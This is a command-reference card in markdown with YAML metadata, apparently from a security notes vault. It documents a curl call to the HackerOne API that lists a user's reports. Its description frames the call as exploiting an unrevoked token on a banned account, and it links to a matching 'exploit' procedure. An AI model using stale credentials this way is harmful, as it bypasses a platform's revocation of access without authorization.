---
data: >-
  curl "https://api.hackerone.com/v1/hackers/me/reports" -X GET -u
  "mrtst:XXXXXXXXXXXXXXXXXXXX=" -H 'Accept: application/json'
tags:
  - api
  - hackerone
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.471Z'
id: 552fae48-40d6-401f-bea7-8f17270235e5
verified: false
validated: true
submitted: true
---
# curl-hackerone-fetch-reports

## Command

```bash
curl "https://api.hackerone.com/v1/hackers/me/reports" -X GET -u "mrtst:XXXXXXXXXXXXXXXXXXXX=" -H 'Accept: application/json'
```

## Description

Retrieves the list of vulnerability reports for the authenticated HackerOne user, exploiting unrevoked token access on a banned account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Basic auth with username:token | Yes |
| URL | Endpoint for reports | Yes |
| `-H 'Accept: application/json'` | Request JSON format | Yes |

## Examples

### Basic Usage

```bash
curl "https://api.hackerone.com/v1/hackers/me/reports" -X GET -u "mrtst:XXXXXXXXXXXXXXXXXXXX=" -H 'Accept: application/json'
```

### Advanced Usage

Add silent mode: ```bash
curl -s "https://api.hackerone.com/v1/hackers/me/reports" -X GET -u "mrtst:XXXXXXXXXXXXXXXXXXXX=" -H 'Accept: application/json' | jq .
```

## Expected Output

JSON array of reports with details like id, title, state, and vulnerabilities.

## Related

- [[commands/curl-hackerone-fetch-balance]]
- [[procedures/Exploit-HackerOne-API-with-Old-Token]]
